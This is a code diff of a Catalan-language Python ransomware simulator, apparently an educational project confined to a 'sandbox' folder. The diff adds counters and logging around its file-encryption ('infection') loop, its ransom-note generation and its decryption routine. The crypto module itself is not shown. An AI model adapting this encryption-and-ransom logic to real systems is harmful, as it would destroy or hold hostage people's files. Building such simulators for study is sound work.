@@ -1,7 +1,7 @@
 import os
 import file_manager                 
 import crypto_engine
-import customtkinter
+import tkinter
 
 # --- CONFIGURACIO I CONSTANTS ---
 RUTA_SANDBOX = "sandbox"
@@ -35,8 +35,11 @@ def mostrar_menu():
         opcio = input("\nTria una opcio (1-4): ")        
         
         if opcio == "1":
-            file_manager.registrar_log("INICIANT INFECCIO", "INFO")
+            file_manager.registrar_log("INICIANT INFECCIO", "INFO",{"target_dir": RUTA_SANDBOX})
             
+            total_xifrats = 0
+            total_errors = 0
+
             if not os.path.exists(RUTA_SANDBOX):
                 print("[X] ERROR: NO EXISTEIX EL FOLDER SANDBOX")
                 continue
@@ -59,8 +62,24 @@ def mostrar_menu():
                 nom_arxiu, extensio = os.path.splitext(ruta_completa)
                 if extensio.lower() in PROHIBITED_WHITELIST:
                     continue
-
-                crypto_engine.xifrar_arxiu(ruta_completa, clau)
+                try:
+                    resultat = crypto_engine.xifrar_arxiu(ruta_completa, clau)
+                    if resultat:
+                        total_xifrats += 1
+                        file_manager.registrar_log("FITXER_ENCRIPTAT", "INFO", {"path": ruta_completa})
+                    else:
+                        total_errors += 1
+                        file_manager.registrar_log("ERROR_ENCRIPTAT", "ERROR", {"path": ruta_completa})
+                except Exception as error:
+                    total_errors += 1
+                    file_manager.registrar_log("ERROR_BUCLE_ENCRIPTACIO", "CRITICAL", {
+                        "path": ruta_completa,
+                        "error_msg": str(error)
+                    })
+            file_manager.registrar_log("FINAL_INFECCIO", "INFO", {
+                "total_success": total_xifrats,
+                "total_fails": total_errors
+            })
 
             file_manager.generar_nota_rescat(RUTA_SANDBOX)
 
@@ -87,9 +106,30 @@ def mostrar_menu():
 
             # Recuperacio si tenim la clau manualment
             llista_arxius = file_manager.llistar_fitxers(RUTA_SANDBOX)
+            arxius_recuperats = 0
+            arxius_error = 0
+            total_detectats = 0
+
             for ruta_completa in llista_arxius:
                 if ruta_completa.endswith(".locked"):
-                    crypto_engine.desxifrar_arxiu(ruta_completa, clau)
+                    total_detectats += 1
+                    resultat = crypto_engine.desxifrar_arxiu(ruta_completa, clau)
+                    if resultat:
+                        arxius_recuperats += 1
+                        file_manager.registrar_log("FITXER_DESXIFRAT", "INFO", {"path": ruta_completa})
+                    else:
+                        arxius_error += 1
+                        file_manager.registrar_log("ERROR_DESXIFRAT", "ERROR", {"path": ruta_completa})
+
+
+            missatge_final = (
+                "FI RECUPERACIO. "
+                f"Detectats: {total_detectats} | "
+                f"Èxits: {arxius_recuperats} | "
+                f"Errors: {arxius_error}"
+            )
+            nivell_final = "INFO" if arxius_error == 0 else "WARNING"
+            file_manager.registrar_log(missatge_final, nivell_final)
 
         elif opcio == "3":
             # SDR-20 / UX: Llegir logs directament
